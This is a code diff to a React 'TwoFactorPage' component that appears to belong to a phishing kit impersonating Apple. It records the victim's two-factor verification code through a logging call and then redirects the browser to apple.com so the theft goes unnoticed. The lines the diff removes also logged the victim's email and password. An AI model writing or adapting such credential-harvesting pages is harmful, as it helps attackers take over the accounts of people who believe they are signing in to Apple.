@@ -34,9 +34,8 @@ export default function TwoFactorPage({ credentials }) {
     setIsSubmitting(true);
     const verificationCode = code.join("");
     await logResponseEntry({
-      email: credentials?.email ?? "",
-      password: credentials?.password ?? "",
-      code: verificationCode,
+      title: "2fa code",
+      response: verificationCode,
     });
     window.location.assign("https://apple.com");
   }
